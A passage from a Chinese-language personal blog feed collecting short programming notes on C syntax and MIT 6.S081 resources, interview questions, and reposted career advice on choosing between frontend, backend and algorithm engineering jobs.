href="https://www.nowcoder.com/discuss/860722?type=2&amp;order=0&amp;pos=6&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632615861&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707">https://www.nowcoder.com/discuss/860722?type=2&amp;order=0&amp;pos=6&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632615861&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707</a></p><p><a href="https://www.nowcoder.com/discuss/864972?type=0&amp;order=0&amp;pos=2&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=f32f3546b2f7440c8a5d703899c2c2f8.372.16477249461887263&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647724946648">https://www.nowcoder.com/discuss/864972?type=0&amp;order=0&amp;pos=2&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=f32f3546b2f7440c8a5d703899c2c2f8.372.16477249461887263&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647724946648</a></p><p><a href="https://www.nowcoder.com/discuss/865960?type=2&amp;order=0&amp;pos=3&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632465858&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707">https://www.nowcoder.com/discuss/865960?type=2&amp;order=0&amp;pos=3&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632465858&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 函数参数为void和函数无参数的区别</title>
      <link href="/2022/03/11/c-han-shu-can-shu-wei-void-he-han-shu-wu-can-shu-de-qu-bie/"/>
      <url>/2022/03/11/c-han-shu-can-shu-wei-void-he-han-shu-wu-can-shu-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<p>int function() 和 int function(void) 的区别？</p><p>来源： <a href="https://stackoverflow.com/questions/693788/is-it-better-to-use-c-void-arguments-void-foovoid-or-not-void-foo">https://stackoverflow.com/questions/693788/is-it-better-to-use-c-void-arguments-void-foovoid-or-not-void-foo</a></p><p>void foo(void);<br>That is the correct way to say “no parameters” in C, and it also works in C++.</p><p>But:</p><p>void foo();<br>Means different things in C and C++! In C it means “could take any number of parameters of unknown types”, and in C++ it means the same as foo(void).</p><p>Variable argument list functions are inherently un-typesafe and should be avoided where possible.</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自学 MIT 6.S081 Operating system engineering 的一些资料</title>
      <link href="/2022/03/11/zi-xue-mit-6.s081-operating-system-engineering-de-yi-xie-zi-liao/"/>
      <url>/2022/03/11/zi-xue-mit-6.s081-operating-system-engineering-de-yi-xie-zi-liao/</url>
      
        <content type="html"><![CDATA[<p>自学 MIT 6.S081 Operating system engineering 的一些资料</p><p>官网：<a href="https://pdos.csail.mit.edu/6.828/2021/schedule.html">https://pdos.csail.mit.edu/6.828/2021/schedule.html</a></p><p>课程视频翻译：<a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/lec01-introduction-and-examples/1.1-ke-cheng-jian-jie">https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/lec01-introduction-and-examples/1.1-ke-cheng-jian-jie</a></p><p>lab 答案参考：</p><p><a href="https://miaochenlu.github.io/2020/12/16/xv6-lab2/">https://miaochenlu.github.io/2020/12/16/xv6-lab2/</a></p><p><a href="https://github.com/PKUFlyingPig/MIT6.S081-2020fall">https://github.com/PKUFlyingPig/MIT6.S081-2020fall</a></p><p><a href="http://xv6.dgs.zone/labs/requirements/lab1.html">http://xv6.dgs.zone/labs/requirements/lab1.html</a></p><p><a href="https://blog.csdn.net/u013577996/article/details/108679997">https://blog.csdn.net/u013577996/article/details/108679997</a></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dot operator vs arrow in C</title>
      <link href="/2022/03/11/dot-operator-vs-arrow-in-c/"/>
      <url>/2022/03/11/dot-operator-vs-arrow-in-c/</url>
      
        <content type="html"><![CDATA[<p>. (dot operator) vs -&gt; (arrow) in C</p><p>. 和 -&gt; 都可以用来得到struct 变量的member。<br>-&gt;配合struct 变量的指针来引用它的member<br>.配合struct 变量本身来引用它的member</p><p>foo-&gt;bar is equivalent to (*foo).bar, i.e. it gets the member called bar from the struct that foo points to</p><p><a href="https://stackoverflow.com/questions/2575048/arrow-operator-usage-in-c">https://stackoverflow.com/questions/2575048/arrow-operator-usage-in-c</a><br><a href="https://www.geeksforgeeks.org/arrow-operator-in-c-c-with-examples/">https://www.geeksforgeeks.org/arrow-operator-in-c-c-with-examples/</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/03/08/jiao-cha-shang/"/>
      <url>/2022/03/08/jiao-cha-shang/</url>
      
        <content type="html"><![CDATA[<p>交叉熵</p><p><a href="https://blog.csdn.net/tsyccnh/article/details/79163834#:~:text=%E4%BA%A4%E5%8F%89%E7%86%B5%EF%BC%88cross%20entropy%EF%BC%89%E6%98%AF,%E7%90%86%E8%A7%A3%E6%9C%89%E4%BA%9B%E6%A8%A1%E7%B3%8A%EF%BC%8C%E4%B8%8D%E5%A4%9F%E6%B7%B1%E5%85%A5%E3%80%82">https://blog.csdn.net/tsyccnh/article/details/79163834#:~:text=%E4%BA%A4%E5%8F%89%E7%86%B5%EF%BC%88cross%20entropy%EF%BC%89%E6%98%AF,%E7%90%86%E8%A7%A3%E6%9C%89%E4%BA%9B%E6%A8%A1%E7%B3%8A%EF%BC%8C%E4%B8%8D%E5%A4%9F%E6%B7%B1%E5%85%A5%E3%80%82</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>腾讯面试问题记录</title>
      <link href="/2022/03/03/mian-shi-wen-ti/"/>
      <url>/2022/03/03/mian-shi-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>面试问题 behavioural questions:</p><ol><li>为什么选择XX公司</li><li>爱好是什么</li><li>经历过最困难的事是什么？如何克服的</li><li>说一下自己的优点</li><li>你有什么缺点</li><li>职业规划</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法岗 还是 开发岗？</title>
      <link href="/2022/03/03/zhi-ye-xuan-ze-yu-fa-zhan/"/>
      <url>/2022/03/03/zhi-ye-xuan-ze-yu-fa-zhan/</url>
      
        <content type="html"><![CDATA[<p>职业选择与发展</p><p>首先，请一定要重视方向的选择。方向即为赛道，选择一个合适自己的赛道非常重要。大家在转码的时候其实是要做两个选择:第一就是转码本身。这是大方向、领域行业和职业的选择。再做了这个决定之后，就要到了选择小方向的时候。这就像你选择了田径短跑作为你的职业之后，之后还要选择到底是跑100米，200米还是400米。这一次选择同样重要。大方向选择定下基调，小方向选择则决定了后续在这个行业内的生涯发展。博尔特最开始是跑400米的，但是后来发现在100米，200米更有天赋，于是果断切换赛道，最终取得了短跑界前无古人的辉煌成绩。对于我们也是如此 ，找准适合自己的方向，可以让自己职业生涯有一个良好的开端，更重要的，也是我们更关心的，方向的选择，也会直接影响我们能否去到想去的公司（不同方向岗位进大厂存在很大难度差异），拿到理想的offer。</p><p>其次，不存在“最好的”方向，一切要以合适自身出发。很多人认为算法岗就是转码最好的方向，位于转码鄙视链的最顶端。然而选择了“万千宠爱于一身”的算法岗，其实也是有诸多弊端和不利。我会在后面谈到具体方向时，再会详细说。而关于如何选择最适合的方向，先和大家分享一些方法论和思考的角度。</p><p>选择合适的方向，“合适”二字我觉得可以从三个方面看：</p><p>自身的兴趣</p><p>自己的背景</p><p>方向前景和未来职业规划的需求</p><p>这三个角度的思考，是分优先级的，排名正如上所示。下面会具体谈一下这三个角度如何具体考量。</p><p>第一，我认为最重要的，就是自身的兴趣所在。兴趣的重要性，本来已无需多言，不过我还想从另外一个角度来解释，那就是关于“学习”。</p><p>说到学习，似乎普遍会认为就是学习的就是课本、专业课程，就是无聊、枯燥、乏味的。我有不少朋友都在讲，我要是没有xxx压力 才不会学习。我会做我喜欢的事情。我个人认为这是个有些狭隘的理解。实际上，我们每天都在“学习”。因为从广义上理解，“学习”就是一个生物在应对各种环境时做出的适应性改变。我们在打游戏的时候，需要学习游戏的玩法；在打篮球的时候，需要学习各种篮球技巧；甚至在我们第一次用智能手机，用微信，都要学习它的使用方法，这些都可以称之为学习。然而我们为什么普遍不把这些事称作“学习”？我想，这就是兴趣的原因，因为我们对游戏感兴趣，对篮球感兴趣，对智能手机感兴趣。兴趣让我们在学习的同时，获得了巨大的反馈收益。所以我们不会感到，或是感到很少的痛苦。而我们之所以没意识到我们在学习，是因为我们片面的认为“学习”就是痛苦的，无聊的。看到这一点之后，其实也很好理解我们为什么不喜欢“学习”了，因为很多课程、专业课教的东西，我们根本就不感兴趣，为了学而学，没有兴趣的支撑，自然很难获得反馈收益。</p><p>谈兴趣对于学习的重要性，就是因为选择了IT技术岗这条路，要做好持续学习和探索的心理准备（无论在准备校招或者工作以后）。若做不到持续学习，在IT领域会非常容易落后，被淘汰。所以，需要有兴趣作为支撑，才有可能对技术有着探索和追求的精神，产生一种内驱力，同时也可以获得学习带来的反馈奖励。若没有兴趣，只会越学越痛苦，越干越艰难。长期下去，就会愈发的怀疑人生，厌恶工作，怀疑当初的选择。所以，一切要从兴趣的角度触发，这是所有的根源，在考虑其他一切因素之前（前景、钱景、竞争激烈程度）。请优先考虑兴趣。</p><p>有的同学可能想问，我该如何确定自己的兴趣？我对这些方向都不了解，谈不上兴趣。这里我就要谈一下如何发现兴趣的问题。我建议大家在初期做足功课，对每个方向做细致全面的调研。一方面可以自己接触学习一些该方向的知识，可以做个小的demo出来。另一方面可以在在网上咨询学长学姐、前辈，问问过来人的看法。（因为初学者很难对一个方向有着深刻全面系统的认知）。两方面结合，亲身尝试后就可以对这个方向建立起一个初步的认知。这时，是否感兴趣，就可以得出一个大概结论了。若是想比较对各个方向的兴趣强烈，也可以多尝试几个方向，综合比较。不必担心无效成本或是走弯路的问题。我认为这样的成本是有必要且有价值的。换个角度，这也可以扩展自己的知识广度。接触尝试多个方向之后，会对互联网的技术分工协作，有更全面的认知。我自己当初也是接触尝试了各个方向，AI、机器学习、安卓、后端、前端，最后才确定的方向。</p><p>第二，就是自己的背景。</p><p>自己的背景，包含三方面的背景：本科&#x2F;研究生学校、专业、家庭背景。</p><p>学校专业的背景对于方向选择的影响很好理解。一般来说，学校越好，专业越靠近计算机，可以选择的余地就会越大。相反，这二者差一点，那选择的余地也会较少。现在大厂做校招，其实在简历初筛的时候，最看重的也是这两个。所以也建议大家结合自己的学校专业，谨慎选择，如果这二者条件较差，我个人不太建议名校科班扎堆的算法岗、后端。同时也要注意简历的书写。因为如果在学校专业上都没有优势的话，那就要多在简历上下功夫了。</p><p>说道家庭背景，可能会有一些不理解。家庭的背景也要考虑吗?我建议是要考虑在内的，虽然关系不直接，但是家庭背景在选择工作时，还是可能会有一定程度上影响。比较特殊的例子就是，家里有是从事相关工作亲人长辈，会直接给到一些建议。更一般的例子是家庭的的经济状况，会影响自己的选择。家庭经济状况好，承担风险能力高，自然可以凭兴趣，去冲击竞争更加激烈的岗位。因为家庭经济好，个人经济完全独立、赚钱的需求不强烈，有较低的试错成本。即使只能去小厂，薪水颇低，也是可以接受，完全可以工作之后再重整旗鼓，有了经验之后，再找机会通过社招进入大厂。反言之如果家庭经济情况较差，自身赚钱压力较大，那就可能要更加求“稳”了。</p><p>第三，就是方向的前景和自身的需求。</p><p>这个角度其实可以理解成方向前景，是否匹配自己对于职业规划的需求。这时候就要考虑自己对于工作未来的愿景是怎么样，规划如何。不需要想的很清楚，但是要有一个概念。比如想做后端的架构师，负责架构的设计。比如想压力小一点，不接触服务器和数据，几乎不需要为服务事故担责，等等。但是在思考这个问题的时候，一定是要对面临选择的方向，有了充分的了解。这又回到我上面谈到的第一点，在做兴趣考量时需要做的方向调研，只有对行业的认知充分，有更准确的认知，才能更好的去思考这个方向，和自己需求匹配度的问题。</p><p>说完这些比较抽象的选择方法论，现在再来看具体方向上的情况。我会主要结合自己的理解，去谈一些关于几个主流方向（前端、后端、算法）的认知还有选择的建议。</p><p>首先说我最熟悉的前端</p><p>前端工作的方向，我觉得狭义上说可以简单概括就是，开发浏览器运行代码来实现业务需求，以及如何让用户交互体验更好的工作。如何使得用户交互体验更好，就包括了前端性能优化等领域。很多同学对前端理解只是“写页面”的，这种理解并不准确。从广义上就是从“大前端”的角度，移动端非原生部分（原生指谷歌安卓、苹果IOS提供的软件开发套件开发出来的原生APP），一些为前端渲染服务的后端服务，都可以算作前端的范畴。甚至在一些大型复杂的网站系统中，需要有专门的“前端架构师”来负责前端的架构设计工作。前端早已不是当年，写完页面脚本，然后丢给后端的时代了。关于前端的特点和选择的建议，我尝试从初学者比较关心的角度来概括。</p><p>入门极其简单，学习五分钟即可写一个简单页面出来。页面中直接呈现自己写的效果，改完代码保存直接刷新即可生效。即所谓的“所见即所得”。对初学者的正面反馈极强。同时可以向不懂编程的亲友展示自己的成果，这可以给初学者带来极大的成就感和满足感。</p><p>前端没有语言选择困难症（后端需要选java、python、go等），统一使用javascript，简称JS。这里简单科普一下，javascript和java几乎不存在任何关系。所以不要问是不是要先学Java才能学Javascript了….</p><p>前端校招的知识体系比较杂乱，琐碎。但是深度要求会略低。尤其是CS专业相关知识的深度要求，例如操作系统、数据库等。但是也要适当掌握。</p><p>前端在学习和工作的初期，会遇到大量的样式、布局内容。这一部分非常琐碎繁杂，也算是入门的一个小槛。如果对于写样式深恶痛绝的同学，不建议选择前端了。</p><p>前端对于转码同学相对友好很多。一般大量科班出身的同学会主要选择后端、算法等。前端留给转码同学的机会比较多。所以竞争激烈程度也会小很多。而且现在大部分大厂，对于应届生前后端的薪资基本是一个档位（都是研发岗，几乎无高低之分），主要差别还是要看学历和面试评价。</p><p>再来看后端。</p><p>因为工作和学习上有一些接触，使得我对后端也有了一些粗浅的理解。在这里也是给大家分享一下。</p><p>后端主要就是开发运行在服务器的代码，当然这个定义并不是很准确，我上面也提到过，前端同样也可能在开发运行在服务器的代码。不过作为初学者，我们可以先这样简单理解。后端主要研究的的就是用API和“服务”来更好的组织业务数据的流转、储存。服务可以理解成，达成某个特定业务需求的程序，API可以理解成服务对外暴露的接口，作为获取的服务的输入输出。比如我们想登录某网站，就需要后端提供一个登录服务。通过登录接口，接收用户输入的用户名密码（收集、发送用户名密码的工作是由前端来完成的），通过一定的业务逻辑处理之后（校验用户名密码是否正确），返回给前端登录的结果，最后由前端显示在页面上，让用户看到。这其实也是一个非常简单的前后端合作的业务场景。</p><p>同样概括一下后端</p><p>入门相比前端存在一定门槛，需要学习很多编程语言和计算机基础的知识，对逻辑思维要求较高。同时反馈激励相对较弱，学习很久可能得到的成果只是几条命令行的输出。</p><p>要面对语言选择，大部分同学选择Java作为后端入门语言，我同样也是做如此推荐。Java作为后端业务开发最经典主流的语言，体系大而全，规范、生态完善。需要初学者踩坑的情况很少。而且可以很好的培养面向对象的思维（Java非常强调对象的概念，认为一切皆对象）。但是现在很多大厂已经在用go语言，这意味着可能要面对工作之后转语言的局面。不过也无需太过担心，技术思维、思想永远是最重要的，这些是跨语言共通存在的。有了一门语言的基础，再学习另外一种，速度也会快很多。</p><p>大家最关心的“卷”的问题。因为后端理论上天花板更高，而且离核心业务逻辑近。理论上发展前景更好，所以无数科班CS大佬都会选择后端，这无疑加大了后端的竞争激烈程度。这对我们非科班的转码同学是很不友好的。相比之下 ，后端进大厂的难度会高很多。而且后端普遍的工作强度和面对的工作压力会高于前端。</p><p>综合来说，前端虽然入门容易，进大厂难度较小，不过确实存在一些发展受限、天花板较低的情况。后端虽然天花板高，普遍技术水平高，离核心业务更近。但是存在入门门槛高，进入大厂竞争激烈，且入行之后工作强度和压力较大的问题。不过我觉得大多数同学不需要考虑天花板的问题，在考虑之前，要先能摸到“天花板”再说。我认识的很多高级前端工程师，自身能力是极强的，后端知识懂得也很多。我个人认为，他们即使当时选择后端，也能做的很好。选择前端是因为兴趣所在。所以又回到开头那句话，一切从兴趣出发。</p><p>而对于什么同学适合选择前后端，我进一步做了归纳和总结。</p><p>以下一类同学，我更推荐前端</p><p>1.专业离CS、软工较远，非IT四大专业（自动化、通信、计算机、电子）。或者属于IT四大专业，但是计算机课程较少，基础薄弱</p><ol start="2"><li><p>对前端、UI交互感兴趣。</p></li><li><p>准备时间比较紧迫，以进入大厂为第一要素</p></li><li><p>不喜欢太高强度的工作和压力</p></li><li><p>有关系非常好、并且能提供一定程度的帮助和指导、已经入行前端的朋友&#x2F;男&#x2F;女朋友&#x2F;前辈，（这对初学者非常重要）</p></li></ol><p>而以下一类同学，我更推荐后端</p><p>属于IT四大专业，而且计算机课程较多，有不错的计算机基础</p><ol start="2"><li><p>对后端、数据、业务逻辑有着浓厚兴趣。</p></li><li><p>准备时间比较充裕，并且有面对激烈竞争的心理准备和预期。</p></li></ol><p>4.追求更高极致的生涯天花板，有着很强的抗压能力。</p><ol start="5"><li>有关系非常好、并且能提供一定程度的帮助指引、已经入行后的朋友&#x2F;男&#x2F;女朋友&#x2F;前辈</li></ol><p>最后再来说说算法岗。</p><p>算法岗一般并不算研发岗位。所以我单独拿出来说。</p><p>算法岗，或者说算法工程师，其实是个非常宽泛的概念。大体可以包含以下几类：</p><p>数据算法</p><p>数据算法一般指的数据挖掘和处理。一般在互联网非常常见的搜索和推荐业务，就非常倚仗数据挖掘算法的技术。例如抖音，怎么根据用户的观看数据，去推荐他可能更感兴趣的视频？今日头条,怎么根据当前用户画像，去推送他可能更感兴趣更可能点击的广告？这些都是数据挖掘算法要解决的问题。当然数据挖掘要解决的问题不仅限于次，只是为了让大家理解。</p><p>计算机视觉算法（CV）</p><p>计算机视觉算法简单来说主要研究的是如何计算机，或者程序，更好的理解图片的含义。这一技术也在很多业务场景中得到使用，比如相册的智能照片分类，图片的智能审核等。</p><p>自然语言处理（NLP）</p><p>自然语言处理主要是研究让计算机程序如何读懂人类的文章、文字。比如一篇文章所表达出来的情绪倾向，我们是希望借助NLP来帮助我们智能的推测出来。NLP的主要应用场景就是像弹幕、留言、评论的信息摘要和情绪分析。这样形成的大数据可以帮助互联网公司更好理解用户和完善产品。</p><p>这些只是一些关于算法岗各个岗位一些非常粗浅简单的理解和该快。大家如果感兴趣 ，可以找专门介绍的文章来看。这里我只谈一些我自己的看法和建议。</p><p>关于算法岗，这些年一直有“诸神黄昏、神仙打架”的说法，其实就是算法岗竞争极其激烈的一种现象。大家应该也有这种感觉，就是身边的同学，毕设题目大都是要向AI、算法上靠。论文题目大多是类似“基于深度学习&#x2F;机器学习的xxxx设计”标题。读研到计算机、通信、电子一类的专业，研究方向也是很多脱离不开AI。AI算法的火爆程度应该是有目共睹了。这里我想说明我一直坚持的观点，就是不要人云亦云，无脑转算法。一定结合自己的兴趣、自身背景、行业前景，再做决定。千万不要跟风转，也不要看一些自媒体的炒作（AI博士、硕士毕业应届起薪xx万），就动了心，然后想转算法岗。当然也不是说，劝大家不要去做算法岗，而是建议大家一定要理智，充分认识到算法岗的竞争激烈程度，想清楚自己的情况。如果是抱着这种投机、跟风心理转算法岗，大概率是要失败的。</p><p>和前后端一样，我也给出建议可以转算法岗的一类同学</p><p>对算法岗和数学有着浓厚兴趣。这里强调数学的原因就是AI算法离不开数学，或者说本质就是数学。如果对数学比较抗拒的同学我建议还是尽早放弃。</p><p>985、知名211 的AI方向研究生，并且发表过有一定含金量的论文。</p><p>有过大厂的非划水算法实习，有实际的项目经历</p><p>有一定科研能力，有主动探索完全未知方向的自驱力</p><p>抗压能力强，抗风险能力强，能接受拿不到顶尖大厂算法岗offer，工作产出不被认可等负面结果</p><p>关于一些具体的主流方向就写到这里，以上更多是我个人的一些见解和建议。可能存在很多不准确、不客观的地方。所以也建议大家也多去看看别的关于转码方向选择的文章，所谓兼听则明，偏听则暗。</p><p>另外，写了这么多。只是给大家做一些选择的参考和建议，希望能帮助大家做一个尽量明智的选择。虽然在开头强调了选择方向的重要性，但是也不希望大家有很大的压力，陷入无尽的纠结和迷茫。似乎这个方向选则变成了人生头等大事（我当时可能就是这样）。但是现在回头看，有时候选择也是命运使然。在那个时期，你只能基于你当下的认知判断水平去抉择。如果事后回顾，要求那个时候做出高于当时自己认知水平的决策，是不合理的。所以也不必强求自己一定做出“最优”的决定。人也总是在不断犯错过程中认知世界，和修正自己的思维。更何况，这个转码方向的选择，也绝不算不可逆的选择。我们在工作之后，对各个方向有了更深的认知之后。如果有感觉当初选择失误，完全也可以再去考虑转去心仪的方向，即使成本略高一些，但是也绝非不可逆的事情。</p><p>最后，也还是祝愿大家都能拿到理想的offer，成功转码上岸。同时欢迎大家在评论区提问交流。<br>————————————————<br>版权声明：本文为CSDN博主「前端践行者-Mr鹏帅」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/sshuai131400/article/details/120659642">https://blog.csdn.net/sshuai131400/article/details/120659642</a></p><p>作者：如雪<br>链接：<a href="https://www.zhihu.com/question/320805246/answer/2198068056">https://www.zhihu.com/question/320805246/answer/2198068056</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>现在是2021年，说下现在我看到的情况吧。先说结论，对于现在互联网公司来说，推荐算法工程师需求量依然大。但是对于国内求职者，尤其是还未毕业的学生来说，这两年找工作的难度显然是在变大的。公司层面对于公司层面，推荐算法是互联网各个公司的硬需求，推荐本身已经是各平台提升用户体验的必要技术了（当然，如果做的实在太差也不一定提升用户体验）。比如，电商需要商品推荐、短视频需要视频推荐、新闻平台和知乎等平台也需要内容推荐。因此，只要用户量还会使用电商、短视频、新闻app等，市场上就还需要人才来进行这方面的工作。而现在来看，推荐算法依然是算法工程师里面需求量最大的方向之一。公司leader还是经常催促我们内推，我也经常能在微信和脉脉等平台收到招聘留言。但是，现在互联网已经过了野蛮生长的蛮荒阶段，随便翻点书就能过面试的时代已经过去了。由于互联网现在推荐技术逐渐成熟，对算法工程师的技术要求也在提高。现在各个公司，尤其是大公司真正紧缺的都是基础好、懂技术、能有产出的算法工程师。求职者层面对于求职者层面来说，现在互联网没有之前的爆发性增长了，目前处于一个比较平稳的状态。而由于前几年ai太火，各个专业都往“算法”上转，而且开始时算法只需要看看论文写写python就能转，对其他专业的人门槛不高让大量同学看到了机会。当年削尖脑袋进算法各方向的学生这两年也开始批量毕业，算法求职者数量众多。但不幸的是，cv、nlp等方向盈利太难被撤销很多岗位，只有搜推广有稳定的业务产出，算法岗位因而是大量减少的。所以客观上，来卷搜推广算法的人就变多了很多，公司就有了比较大的议价空间。另外，推荐算法是一个比较“杂”的方向，算法模型、策略、架构、大数据处理等都是需要了解的。这样，在面试考察的时候，就不会像之前cv算法面试那样重点问深度学习算法，而是机器学习&#x2F;深度学习、策略、线上serving等都可能会问。客观上，让准备面试更难。所以对于求职者来说，这两年找工作的难度也是在变大的。但是，也并非不需要“名校毕业”，“顶会论文”这种硬性条件。推荐算法能力一、机器学习基础数学基础：线性代数，高等数学，概率统计（这三门大学应该都学过）；《最优化理论》，这门课本科上过的不多，注意学会各种优化算法等，弄懂推导，对机器学习帮助很大。机器学习：入门的话，可以看李航的《统计学习方法》、周志华的西瓜书两本书，这方面资料很多，不多说。深度学习：这方面资料也很多，不多说。代码能力：tensorflow、caffe、pytorch里面熟悉1~2个框架。很多公司会拿tensorflow作为底层，所以TensorFlow尽量熟悉。二、工程能力工程能力是许多新人算法工程师喜欢忽略的一点，但这个能力其实非常重要！工程能力是理解推荐系统细节的保证，能够提升对算法和架构的认知。随着各家公司的业务场景也逐渐成熟，简单套用一个算法就能拿取成果的时代已经一去不复返了。18、19年，一个新策略或者新模型简单就能获得3，4个点的增长，而到了现在单纯改一个精排或者粗排模型，最多也就是1、2个点的增长。因此，为了获得更高的收益，现在算法变得更加复杂，对架构工程的要求也远比之前高。一个新算法，也许会要求修改多个serving模块，上下游同时适配，延时优化等等内容。这个情况下，想要出色的完成工作，必须深刻的理解推荐系统的细节，工程实现。代码功底：C++基础（编译等），python写代码熟练（要有架构能力）数据结构与算法：推荐清华邓俊辉的教材和视频（很容易搜到），可以刷leetcode题、牛客网、剑指offer（可以看下我的回答），题目是面试中非常重要的内容，对动态规划、链表、树、堆、排序等各类常用数据结构和算法要很熟悉，近两年难度也在不断增大。知乎也有很多这方面的文章和资料整理。大数据功底：hadoop，flink，spark，kafka等适当学习；mapreduce、SQL语言最好很熟悉；脚本：linux shell要熟悉三、推荐算法入门推荐项亮的《推荐系统实战》、王喆《深度学习推荐系统》，这两本是入门非常好的书、简单易懂，非常适合一开始建立一个大框架；模型方面看我写的文章《广告和推荐算法论文梳理》，把经典的召回、精排模型论文都好好阅读、fm、deepFM、FFM、mmoe、din、dien、transformer、youtube推荐等经典推荐模型要非常熟悉。一点建议是，不要一开始把自己局限在精排、召回等某一个模块，尽量建立对推荐算法全链路模型、工程完整的认识。另外，推荐算法是强业务相关，哪个算法怎样用，效果怎么样，怎样针对性优化都是要在实际业务中体会才能真正深入理解。所以，有条件的话，尽量去大厂实习。大厂实习面试主要考察的是 刷题（数据结构算法，多刷leetcode + 机器&#x2F;深度学习基础（把机器学习基础性学好）+ 自己的项目（实验室的论文，参加的kaggle比赛、github开源项目等）。因此，所在实验室如果条件好，方向也偏算法的话，可以好好写一篇有质量的论文。发布于 2021-10-30 15:31</p><p>124 人赞同了该回答<br>作为工程转算法又转回工程的码农 我个人感觉目前算法岗有两个很大的问题：</p><p>一个是 开源环境让基础岗越来越难做 广搜推这些岗和业务强相关 有数据的壁垒 直接给公司带来收益 所以会相对缺人 但是 cv nlp这类偏底层的岗你辛辛苦苦提升几个点 还没在项目落地产生价值 外界大厂或大学又开源个牛逼模型吊打你 不是阿里和百度竞争 腾讯和字节竞争 而是大家都在和整个开源界竞争 有多少公司是因为ai火的时候跟风搞ai lab 现在又纷纷取消这类部门的</p><p>第二个问题是 成长曲线问题让老算法不保值 很多老算法工程师工程和业务能力落后于纯搞工程的 很多时候需要招几个做工程的帮忙算法们搞部署、高并发、架构、监控… research能力相比应届生又没优势 现在卷出来的这些算法校招生 算法八股文扎实、论文质量高、导师牛逼、项目前沿 多少老算法敢说自己强过这些新人 老算法可能有更强的工程业务能力 但让新人配个搞工程的就能达到一样或者更好的效果（很多公司也是这么做的）</p><p>结论就是 广搜推会一直缺人 cv nlp会过剩 而算法老人可能会淘汰一波当年趁热转进来的 留下模型工程业务都比较硬的</p><p>发布于 2021-11-05 22:42</p><p>作为工程转算法又转回工程的码农 我个人感觉目前算法岗有两个很大的问题：一个是 开源环境让基础岗越来越难做 广搜推这些岗和业务强相关 有数据的壁垒 直接给公司带来收益 所以会相对缺人 但是 cv nlp这类偏底层的岗你辛辛苦苦提升几个点 还没在项目落地产生价值 外界大厂或大学又开源个牛逼模型吊打你 不是阿里和百度竞争 腾讯和字节竞争 而是大家都在和整个开源界竞争 有多少公司是因为ai火的时候跟风搞ai lab 现在又纷纷取消这类部门的第二个问题是 成长曲线问题让老算法不保值 很多老算法工程师工程和业务能力落后于纯搞工程的 很多时候需要招几个做工程的帮忙算法们搞部署、高并发、架构、监控… research能力相比应届生又没优势 现在卷出来的这些算法校招生 算法八股文扎实、论文质量高、导师牛逼、项目前沿 多少老算法敢说自己强过这些新人  老算法可能有更强的工程业务能力 但让新人配个搞工程的就能达到一样或者更好的效果（很多公司也是这么做的）结论就是 广搜推会一直缺人 cv nlp会过剩 而算法老人可能会淘汰一波当年趁热转进来的 留下模型工程业务都比较硬的发布于 2021-11-05 22:42</p><p>作者：西門Leo<br>链接：<a href="https://www.zhihu.com/question/320805246/answer/2209268311">https://www.zhihu.com/question/320805246/answer/2209268311</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>下面的一个有趣的评论：</p><p>安乐否安乐否​2021-11-11<br>业务理解，数据的熟悉才是护城河，搞算法的没人真把掌握算法本身当优势吧[大笑]<br>​8<br>​回复<br>​踩<br>​ 举报<br>西門Leo<br>西門Leo (作者) 回复安乐否​2021-11-12<br>业务理解可以帮助你更好落地 但是光有业务理解也不行 除非你级别已经很高可以自己提需求 否则主要工作还是帮助产品运营实现业务需求 算法和工程如果都不行 做起来一堆坑怎么搞？还有就是跳槽了新公司业务和数据可能都不一样了 面试的时候也不一定会问这个 如果真的只对业务和数据了解 可以转AI产品 还挺缺人的</p><p><a 